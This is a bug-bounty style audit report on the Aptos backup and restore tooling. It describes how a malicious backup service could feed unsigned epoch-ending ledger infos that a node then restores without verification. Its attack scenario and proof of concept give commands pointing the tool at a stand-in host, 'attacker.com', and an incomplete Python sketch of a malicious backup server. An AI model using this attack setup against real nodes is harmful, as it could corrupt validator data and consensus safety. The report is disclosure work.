# Audit Report

## Title
Malicious Backup Service Can Inject Unsigned Epoch-Ending LedgerInfos Leading to Consensus Safety Violation

## Summary
The epoch-ending backup system does not verify cryptographic signatures on `LedgerInfoWithSignatures` received from the backup service during backup creation. During restoration, if no trusted waypoints are configured, the first epoch-ending ledger info is accepted without signature verification. This allows an attacker controlling a malicious backup service to inject crafted ledger infos with arbitrary validator sets and state roots, which when restored, corrupt the node's epoch-ending data and compromise consensus safety.

## Finding Description

The vulnerability exists in two phases:

**Phase 1: Backup Creation (No Signature Verification)**

When creating an epoch-ending backup, the `EpochEndingBackupController` receives a stream of `LedgerInfoWithSignatures` from the backup service at [1](#0-0) 

These records are processed by the `get_waypoint` function which only validates the epoch number matches the expected sequence, but performs NO cryptographic signature verification: [2](#0-1) 

The backup service address is configurable via command-line: [3](#0-2) 

**Phase 2: Restore Without Verification**

During restoration, the `preheat_impl` function processes ledger infos from the backup. The critical validation logic is at [4](#0-3) 

On the first iteration, `previous_li` is initialized to `None` at [5](#0-4) 

If no trusted waypoint exists for that version, the first ledger info is added WITHOUT any signature verification. Subsequent ledger infos are then verified against this first (potentially malicious) ledger info's `next_epoch_state`.

The production restore command calls this with `None` for `previous_epoch_ending_ledger_info`: [6](#0-5) 

Trusted waypoints are optional and default to empty: [7](#0-6) 

**Attack Scenario:**

1. Attacker deploys malicious HTTP backup service
2. Victim runs backup: `aptos-db-tool backup oneoff epoch-ending --backup-service-address http://attacker.com --start-epoch 0 --end-epoch 10`
3. Malicious service crafts `LedgerInfoWithSignatures` with:
   - Correct sequential epoch numbers (0, 1, 2, ...)
   - Malicious `next_epoch_state` containing attacker-controlled validator sets
   - Malicious `executed_state_id` (state root hash)
   - Empty or invalid BLS signatures
4. Backup client stores these without verification
5. Victim restores: `aptos-db-tool restore oneoff epoch-ending --epoch-ending-manifest <manifest>`
6. Without trusted waypoints, first ledger info accepted without signature verification
7. Subsequent ledger infos verified against malicious first ledger info
8. Corrupted data written to database at [8](#0-7) 

**What Should Happen:**

The legitimate backup service returns `LedgerInfoWithSignatures` from the database that already have valid signatures from 2f+1 validators. The signature verification method `verify_multi_signatures` performs comprehensive validation: [9](#0-8) 

This verifies:
- BLS aggregated signature cryptographically
- Quorum voting power (2f+1 threshold)
- All signers are known validators

The `EpochState::verify` implementation correctly calls this when validating epoch transitions: [10](#0-9) 

However, during backup creation, this verification is never invoked.

## Impact Explanation

This vulnerability qualifies as **Critical Severity** under the Aptos bug bounty program for the following reasons:

**Consensus Safety Violation**: The corrupted epoch-ending ledger infos contain the validator set for each epoch in the `next_epoch_state` field. [11](#0-10)  If a node restores from a malicious backup, it will trust the wrong set of validators for consensus participation, directly violating the consensus safety invariant.

**State Consistency Violation**: The ledger infos also contain `executed_state_id` which is the transaction accumulator hash. A malicious backup service can provide arbitrary values, causing the node to accept invalid state roots and potentially accept blocks that should be rejected.

**Non-Recoverable Impact**: Once the malicious epoch-ending data is written to the database, it becomes the source of truth for that node. The node would participate in consensus using incorrect validator sets, potentially leading to network partition requiring manual intervention or hardfork to resolve.

**No Privileged Access Required**: The attack only requires the victim to configure the backup service address to point to the attacker's server, which could occur through social engineering, misconfiguration, or compromised infrastructure.

## Likelihood Explanation

**High Likelihood** - This attack is realistic because:

1. **User Confusion**: The backup service address is configurable, and users might not realize they need to use a trusted service. The default localhost configuration provides false confidence that validation is unnecessary.

2. **Optional Security Measures**: Trusted waypoints are optional with no enforcement or warnings that they are critical for security. The help text suggests they are for "confirming backup is compatible" rather than being essential security controls.

3. **Common Restore Scenario**: The production code shows restores are commonly done without `previous_epoch_ending_ledger_info` (passing `None`), making the vulnerability exploitable in normal usage.

4. **No Warning Indicators**: The system provides no warnings when accepting unsigned ledger infos during backup or restore, giving users no indication of the security risk.

## Recommendation

**Immediate Fix**: Add signature verification during backup creation in the `get_waypoint` function:

```rust
fn get_waypoint(record: &[u8], epoch: u64, verifier: &ValidatorVerifier) -> Result<Waypoint> {
    let li: LedgerInfoWithSignatures = bcs::from_bytes(record)?;
    ensure!(
        li.ledger_info().epoch() == epoch,
        "Epoch not expected. expected: {}, actual: {}.",
        li.ledger_info().epoch(),
        epoch,
    );
    
    // CRITICAL: Verify signatures before accepting
    li.verify_signatures(verifier)?;
    
    Waypoint::new_epoch_boundary(li.ledger_info())
}
```

However, this requires the `ValidatorVerifier` for each epoch, which may not be available at backup creation time.

**Alternative Fix**: Make trusted waypoints mandatory for restore operations, or require explicit confirmation when restoring without them. Add validation in `preheat_impl`:

```rust
if let Some(wp_trusted) = self.trusted_waypoints.get(&wp_li.version()) {
    ensure!(*wp_trusted == wp_li, ...);
} else if let Some(pre_li) = previous_li {
    pre_li.ledger_info().next_epoch_state()?.verify(&li)?;
} else {
    bail!("SECURITY: Cannot verify ledger info at epoch {} - no trusted waypoint and no previous ledger info. Refusing to restore potentially malicious data. Please provide trusted waypoints via --trust-waypoint.", li.ledger_info().epoch());
}
```

**Long-term Solution**: Implement cryptographic proof-of-correct-backup where the backup service signs a manifest of all ledger infos using a trusted key, similar to how software distributions are signed.

## Proof of Concept

**Step 1: Create malicious backup service**

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import struct

class MaliciousBackupHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/epoch_ending_ledger_infos/' in self.path:
            # Parse start_epoch and end_epoch from path
            parts = self.path.split('/')
            start_epoch = int(parts[2])
            end_epoch = int(parts[3])
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.end_headers()
            
            # Send crafted LedgerInfoWithSignatures for each epoch
            for epoch in range(start_epoch, end_epoch):
                # Craft malicious LedgerInfoWithSignatures with:
                # - Correct epoch number
                # - Malicious validator set in next_epoch_state
                # - Empty signatures
                malicious_li = create_malicious_ledger_info(epoch)
                record_bytes = bcs_serialize(malicious_li)
                
                # Send size-prefixed record
                size = struct.pack('>I', len(record_bytes))
                self.wfile.write(size + record_bytes)

HTTPServer(('0.0.0.0', 6186), MaliciousBackupHandler).serve_forever()
```

**Step 2: Victim creates backup**

```bash
aptos-db-tool backup oneoff epoch-ending \
  --backup-service-address http://attacker.com:6186 \
  --start-epoch 0 \
  --end-epoch 10 \
  --target-db-dir /backup/output
```

**Step 3: Victim restores without trusted waypoints**

```bash
aptos-db-tool restore oneoff epoch-ending \
  --epoch-ending-manifest /backup/output/epoch_ending.manifest \
  --target-db-dir /var/lib/aptos/db
```

**Expected Result**: The malicious epoch-ending ledger infos are written to the database without any signature verification, corrupting the node's epoch history.

**Notes**

This vulnerability demonstrates a critical gap in the backup/restore security model. While the system correctly implements BLS signature verification throughout the consensus layer, this verification is completely bypassed in the backup flow. The optional nature of trusted waypoints, combined with no signature verification during backup creation, creates a critical attack vector that could compromise consensus safety across the network if multiple nodes restore from malicious backups.

The backup service being localhost-only by default provides network-level protection but is insufficient - defense-in-depth requires cryptographic verification even for local services, as the service address is user-configurable and infrastructure compromise is a realistic threat model.

### Citations

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/backup.rs (L83-87)
```rust
        let mut ledger_infos_file = self
            .client
            .get_epoch_ending_ledger_infos(self.start_epoch, self.end_epoch)
            .await?;
        let mut current_epoch: u64 = self.start_epoch;
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/backup.rs (L140-149)
```rust
    fn get_waypoint(record: &[u8], epoch: u64) -> Result<Waypoint> {
        let li: LedgerInfoWithSignatures = bcs::from_bytes(record)?;
        ensure!(
            li.ledger_info().epoch() == epoch,
            "Epoch not expected. expected: {}, actual: {}.",
            li.ledger_info().epoch(),
            epoch,
        );
        Waypoint::new_epoch_boundary(li.ledger_info())
    }
```

**File:** storage/backup/backup-cli/src/utils/backup_service_client.rs (L24-30)
```rust
    #[clap(
        long = "backup-service-address",
        default_value = "http://localhost:6186",
        help = "Backup service address. By default a Aptos Node runs the backup service serving \
        on tcp port 6186 to localhost only."
    )]
    pub address: String,
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L88-88)
```rust
        let mut previous_li: Option<&LedgerInfoWithSignatures> = None;
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L129-147)
```rust
                if let Some(wp_trusted) = self.trusted_waypoints.get(&wp_li.version()) {
                    ensure!(
                        *wp_trusted == wp_li,
                        "Waypoints don't match. In backup: {}, trusted: {}",
                        wp_li,
                        wp_trusted,
                    );
                } else if let Some(pre_li) = previous_li {
                    pre_li
                        .ledger_info()
                        .next_epoch_state()
                        .ok_or_else(|| {
                            anyhow!(
                                "Next epoch state not found from LI at epoch {}.",
                                pre_li.ledger_info().epoch()
                            )
                        })?
                        .verify(&li)?;
                }
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L247-249)
```rust
        match self.controller.run_mode.as_ref() {
            RestoreRunMode::Restore { restore_handler } => {
                restore_handler.save_ledger_infos(&preheat_data.ledger_infos)?;
```

**File:** storage/db-tool/src/restore.rs (L75-81)
```rust
                        EpochEndingRestoreController::new(
                            opt,
                            global.try_into()?,
                            storage.init_storage().await?,
                        )
                        .run(None)
                        .await?;
```

**File:** storage/backup/backup-cli/src/utils/mod.rs (L331-346)
```rust
#[derive(Clone, Default, Parser)]
pub struct TrustedWaypointOpt {
    #[clap(
        long,
        help = "(multiple) When provided, an epoch ending LedgerInfo at the waypoint version will be \
        checked against the hash in the waypoint, but signatures on it are NOT checked. \
        Use this for two purposes: \
        1. set the genesis or the latest waypoint to confirm the backup is compatible. \
        2. set waypoints at versions where writeset transactions were used to overwrite the \
        validator set, so that the signature check is skipped. \
        N.B. LedgerInfos are verified only when restoring / verifying the epoch ending backups, \
        i.e. they are NOT checked at all when doing one-shot restoring of the transaction \
        and state backups."
    )]
    pub trust_waypoint: Vec<Waypoint>,
}
```

**File:** types/src/validator_verifier.rs (L345-386)
```rust
    pub fn verify_multi_signatures<T: CryptoHash + Serialize>(
        &self,
        message: &T,
        multi_signature: &AggregateSignature,
    ) -> std::result::Result<(), VerifyError> {
        // Verify the number of signature is not greater than expected.
        Self::check_num_of_voters(self.len() as u16, multi_signature.get_signers_bitvec())?;
        let mut pub_keys = vec![];
        let mut authors = vec![];
        for index in multi_signature.get_signers_bitvec().iter_ones() {
            let validator = self
                .validator_infos
                .get(index)
                .ok_or(VerifyError::UnknownAuthor)?;
            authors.push(validator.address);
            pub_keys.push(validator.public_key());
        }
        // Verify the quorum voting power of the authors
        self.check_voting_power(authors.iter(), true)?;
        #[cfg(any(test, feature = "fuzzing"))]
        {
            if self.quorum_voting_power == 0 {
                // This should happen only in case of tests.
                // TODO(skedia): Clean up the test behaviors to not rely on empty signature
                // verification
                return Ok(());
            }
        }
        // Verify empty multi signature
        let multi_sig = multi_signature
            .sig()
            .as_ref()
            .ok_or(VerifyError::EmptySignature)?;
        // Verify the optimistically aggregated signature.
        let aggregated_key =
            PublicKey::aggregate(pub_keys).map_err(|_| VerifyError::FailedToAggregatePubKey)?;

        multi_sig
            .verify(message, &aggregated_key)
            .map_err(|_| VerifyError::InvalidMultiSignature)?;
        Ok(())
    }
```

**File:** types/src/epoch_state.rs (L40-50)
```rust
impl Verifier for EpochState {
    fn verify(&self, ledger_info: &LedgerInfoWithSignatures) -> anyhow::Result<()> {
        ensure!(
            self.epoch == ledger_info.ledger_info().epoch(),
            "LedgerInfo has unexpected epoch {}, expected {}",
            ledger_info.ledger_info().epoch(),
            self.epoch
        );
        ledger_info.verify_signatures(&self.verifier)?;
        Ok(())
    }
```

**File:** types/src/block_info.rs (L24-44)
```rust
/// This structure contains all the information needed for tracking a block
/// without having access to the block or its execution output state. It
/// assumes that the block is the last block executed within the ledger.
#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
#[cfg_attr(any(test, feature = "fuzzing"), derive(Arbitrary))]
pub struct BlockInfo {
    /// The epoch to which the block belongs.
    epoch: u64,
    /// The consensus protocol is executed in rounds, which monotonically increase per epoch.
    round: Round,
    /// The identifier (hash) of the block.
    id: HashValue,
    /// The accumulator root hash after executing this block.
    executed_state_id: HashValue,
    /// The version of the latest transaction after executing this block.
    version: Version,
    /// The timestamp this block was proposed by a proposer.
    timestamp_usecs: u64,
    /// An optional field containing the next epoch info
    next_epoch_state: Option<EpochState>,
}
```
